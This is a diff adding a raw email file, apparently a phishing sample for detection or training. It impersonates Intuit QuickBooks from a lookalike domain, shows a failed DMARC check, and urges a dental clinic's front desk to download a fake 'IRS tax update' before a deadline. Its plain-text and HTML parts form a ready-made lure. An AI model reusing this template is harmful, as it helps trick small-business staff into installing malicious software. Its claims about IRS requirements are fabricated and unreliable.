@@ -1,0 +1,40 @@
+From: "Intuit QuickBooks" <support@intuit-quickbooks-update.com>
+To: frontdesk@smileclinic.org
+Subject: Critical Update: Tax Filing Deadline Approaching
+Date: Mon, 8 Dec 2025 13:45:19 -0800
+Message-ID: 20251208134519.39308@mail.sender.com
+Return-Path: support@intuit-quickbooks-update.com
+Reply-To: support@intuit-quickbooks-update.com
+Received: from mail.external.net (mail.external.net [192.0.2.165])
+    by gateway.smileclinic.org with ESMTP id xyz7818
+    for frontdesk@smileclinic.org; Mon, 8 Dec 2025 13:45:19 -0800
+Authentication-Results: gateway.smileclinic.org;
+    spf=neutral smtp.mailfrom=support@intuit-quickbooks-update.com;
+    dmarc=fail header.from=support@intuit-quickbooks-update.com
+Content-Type: multipart/alternative; boundary="boundary-alt-393"
+
+--boundary-alt-393
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+QuickBooks Tax Update Required
+
+Important: The IRS has updated tax filing requirements. Your QuickBooks software needs an immediate update to remain compliant.
+
+Download the required tax update: https://quickbooks-tax-update.com/download
+
+Failure to update by December 15 may result in:
+- Incorrect tax calculations
+- IRS penalties and fines
+- Failed tax submissions
+
+Update now to ensure compliance.
+
+Intuit QuickBooks Support
+
+--boundary-alt-393
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+<html><body><p><strong>QuickBooks Tax Update Required</strong></p><p>Important: The IRS has updated tax filing requirements. Your QuickBooks software needs an immediate update to remain compliant.</p><p><a href="https://quickbooks-tax-update.com/download">Download the required tax update</a></p><p>Failure to update by December 15 may result in:</p><ul><li>Incorrect tax calculations</li><li>IRS penalties and fines</li><li>Failed tax submissions</li></ul><p>Update now to ensure compliance.</p><p>Intuit QuickBooks Support</p></body></html>
+--boundary-alt-393--
